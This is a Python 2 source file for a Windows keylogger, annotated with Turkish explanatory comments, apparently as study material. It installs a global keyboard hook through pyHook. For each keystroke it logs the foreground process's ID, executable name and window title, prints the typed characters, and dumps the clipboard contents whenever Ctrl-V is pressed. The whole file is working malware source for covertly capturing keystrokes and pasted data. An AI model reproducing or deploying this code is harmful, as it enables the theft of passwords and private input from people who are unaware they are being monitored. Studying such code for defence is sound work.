from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # get a handle to the foreground window suanda etkin olan pencereye handle yollar
    hwnd = user32.GetForegroundWindow()
    
    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid)) #pencerenin islev kimligini alir
    
    # store the current process ID
    process_id = "%d" % pid.value
    
    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)#daha sonra bir process acip ve elde edilen islem handleini kullanarak islemin gercek calistirilabilinir adini buluyoruz
    
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    
    # now read its title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)#pencerenin baslik cubugunun tam metnini aliriz
    
    # print out the header if we're in the right process
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)#tum bilgileri guzelce cikarir boylece hangi tus vurusu hangi pencereye gidiyor goruruz
    print
    
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global current_window
    
    # check to see if target changed windows
    if event.WindowName != current_window: # ilk yapilan kullanici pencereyi degistirikmi onun kontrolu
        #degismisse yeni pencerenin adi islenir ve islevi
        current_window = event.WindowName
        get_current_process()
        
    # if they pressed a standard key daha sonra giirlen tus vurusu yazdirilabilir ascii ise onuyazariz
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii) 
    else:
        # if [Ctrl-V], get the value on the clipboard farkli bir seyse asciden farkli olay nesnesinden adini aliriz
        if event.Key == "V":
            
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            print "[PASTE] - %s" % (pasted_value) # kullanici yapistirma iselni yapip yapmadigi kontrol edilir eger oyleyse dump edilir
        else:
            print "[%s]" % event.Key,
    # pass execution to next hook registered zincirdeki bir sonraki hookun islenmesi icin izin vermek icin true doner ve sona erer.
    return True
    
# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke  # kullainici tanimli geri arama islevi
# register the hook and execute forever
kl.HookKeyboard() #tum tuslara baglanmasini ve calismaya devam etmesini soyleriz.hedef bir tusa basinca keystreoke islevi calisir
pythoncom.PumpMessages()
